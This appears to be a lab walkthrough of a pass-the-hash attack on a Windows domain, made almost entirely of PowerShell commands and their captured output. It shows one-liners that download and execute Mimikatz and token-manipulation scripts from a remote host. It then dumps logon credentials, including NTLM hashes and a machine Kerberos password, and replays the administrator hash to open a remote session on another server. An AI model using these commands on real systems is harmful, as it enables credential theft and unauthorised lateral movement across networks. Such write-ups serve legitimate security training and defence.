# Pass the Hash
## Mimikatz & PowerSploit
### Obtain Hash
```
[seclogs.research.security.local]: PS C:\> iex (New-Object Net.WebClient).DownloadString("http://10.0.5.101/Invoke-Mimikatz.ps1")
[seclogs.research.security.local]: PS C:\> 

[seclogs.research.security.local]: PS C:\> iex (New-Object Net.WebClient).DownloadString("http://10.0.5.101/Invoke-TokenManipulation.ps1")
[seclogs.research.security.local]: PS C:\> 

[seclogs.research.security.local]: PS C:\> Invoke-TokenManipulation -Enumerate


Domain              : RESEARCH
Username            : administrator
hToken              : 4740
LogonType           : 2
IsElevated          : True
TokenType           : Primary
SessionID           : 1
PrivilegesEnabled   : {SeChangeNotifyPrivilege, SeImpersonatePrivilege, SeCreateGlobalPrivilege}
PrivilegesAvailable : {SeIncreaseQuotaPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege,
                      SeLoadDriverPrivilege...}
ProcessId           : 2916

Domain              : NT AUTHORITY
Username            : SYSTEM
hToken              : 5672
LogonType           : 0
IsElevated          : True
TokenType           : Primary
SessionID           : 0
PrivilegesEnabled   : {SeCreateTokenPrivilege, SeLockMemoryPrivilege, SeTcbPrivilege, SeSystemProfilePrivilege...}
PrivilegesAvailable : {SeAssignPrimaryTokenPrivilege, SeIncreaseQuotaPrivilege, SeSecurityPrivilege,
                      SeTakeOwnershipPrivilege...}
ProcessId           : 472

Domain              : NT AUTHORITY
Username            : NETWORK SERVICE
hToken              : 3224
LogonType           : 5
IsElevated          : True
TokenType           : Primary
SessionID           : 0
PrivilegesEnabled   : {SeChangeNotifyPrivilege, SeImpersonatePrivilege, SeCreateGlobalPrivilege}
PrivilegesAvailable : {SeAssignPrimaryTokenPrivilege, SeIncreaseQuotaPrivilege, SeAuditPrivilege,
                      SeIncreaseWorkingSetPrivilege}
ProcessId           : 1656



[seclogs.research.security.local]: PS C:\>


[seclogs.research.security.local]: PS C:\> Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
Hostname: seclogs.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # privilege::debug
Privilege '20' OK

mimikatz(powershell) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

372     {0;000003e7} 0 D 16802          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,20p)       Primary
 -> Impersonated !
 * Process Token : {0;000c5805} 0 D 836635      RESEARCH\student        S-1-5-21-1693200156-3137632808-1858025440-1115
(09g,23p)       Primary
 * Thread Token  : {0;000003e7} 0 D 2687642     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,20p)   Impersonation (Deleg
ation)

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 41412 (00000000:0000a1c4)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/1/2024 12:49:43 PM
SID               : S-1-5-90-1
        msv :
         [00000003] Primary
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * NTLM     : 3de2aad7b0b39051ef27c24c8d44f4e9
         * SHA1     : bbb1433ef0aa27702f9c376a3eb26adc5228d08a
        tspkg :
        wdigest :
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * Password : (null)
        kerberos :
         * Username : SECLOGS$
         * Domain   : research.SECURITY.local
         * Password :  oLi8S4cjiqq@6=!mx]2U:gMr"TJ@JYiAv!q"NzyD/Ey#%1<4k]x^^)N'j6<PF4d72ia&ZOIa]l/QY#N_R?TR^!"/][MVw!ITi
r;ARAP'IzF7nWX9xyqSzsg
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SECLOGS$
Domain            : RESEARCH
Logon Server      : (null)
Logon Time        : 11/1/2024 12:49:43 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * NTLM     : 3de2aad7b0b39051ef27c24c8d44f4e9
         * SHA1     : bbb1433ef0aa27702f9c376a3eb26adc5228d08a
        tspkg :
        wdigest :
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * Password : (null)
        kerberos :
         * Username : seclogs$
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 22085 (00000000:00005645)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/1/2024 12:49:42 PM
SID               :
        msv :
         [00000003] Primary
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * NTLM     : 3de2aad7b0b39051ef27c24c8d44f4e9
         * SHA1     : bbb1433ef0aa27702f9c376a3eb26adc5228d08a
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 167787 (00000000:00028f6b)
Session           : Interactive from 1
User Name         : administrator
Domain            : RESEARCH
Logon Server      : PROD
Logon Time        : 11/1/2024 12:49:58 PM
SID               : S-1-5-21-1693200156-3137632808-1858025440-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : RESEARCH
         * NTLM     : 84398159ce4d01cfe10cf34d5dae3909
         * SHA1     : ccc47c4f9541f99b020d38b8f7ea10f7b4b8595c
         [00010000] CredentialKeys
         * NTLM     : 84398159ce4d01cfe10cf34d5dae3909
         * SHA1     : ccc47c4f9541f99b020d38b8f7ea10f7b4b8595c
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : RESEARCH
         * Password : (null)
        kerberos :
         * Username : administrator
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/1/2024 12:49:43 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 41389 (00000000:0000a1ad)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/1/2024 12:49:43 PM
SID               : S-1-5-90-1
        msv :
         [00000003] Primary
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * NTLM     : 3de2aad7b0b39051ef27c24c8d44f4e9
         * SHA1     : bbb1433ef0aa27702f9c376a3eb26adc5228d08a
        tspkg :
        wdigest :
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * Password : (null)
        kerberos :
         * Username : SECLOGS$
         * Domain   : research.SECURITY.local
         * Password :  oLi8S4cjiqq@6=!mx]2U:gMr"TJ@JYiAv!q"NzyD/Ey#%1<4k]x^^)N'j6<PF4d72ia&ZOIa]l/QY#N_R?TR^!"/][MVw!ITi
r;ARAP'IzF7nWX9xyqSzsg
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SECLOGS$
Domain            : RESEARCH
Logon Server      : (null)
Logon Time        : 11/1/2024 12:49:42 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * Password : (null)
        kerberos :
         * Username : seclogs$
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)
        ssp :
        credman :

[seclogs.research.security.local]: PS C:\>
```
### Replay Hash
```
PS C:\tools> . .\Invoke-Mimikatz.ps1
PS C:\tools> Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:84398159ce4d01cfe10cf34d5dae3909 /run:powershell.exe"'
Hostname: client.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:84398159ce4d01cfe10cf34d5
dae3909 /run:powershell.exe
user    : administrator
domain  : research.security.local
program : powershell.exe
impers. : no
NTLM    : 84398159ce4d01cfe10cf34d5dae3909
  |  PID  3916
  |  TID  3912
  |  LSA Process is now R/W
  |  LUID 0 ; 3068873 (00000000:002ed3c9)
  \_ msv1_0   - data copy @ 0000006AA3751A40 : OK !
  \_ kerberos - data copy @ 0000006AA375CB18
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000006AA346E998 (16) -> null

PS C:\tools>
```

Spawns a new PowerShell prompt:

```
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
research\student
PS C:\Windows\system32> Enter-PSSession prod.research.security.local
[prod.research.security.local]: PS C:\Users\Administrator\Documents> whoami
research\administrator
[prod.research.security.local]: PS C:\Users\Administrator\Documents>
```
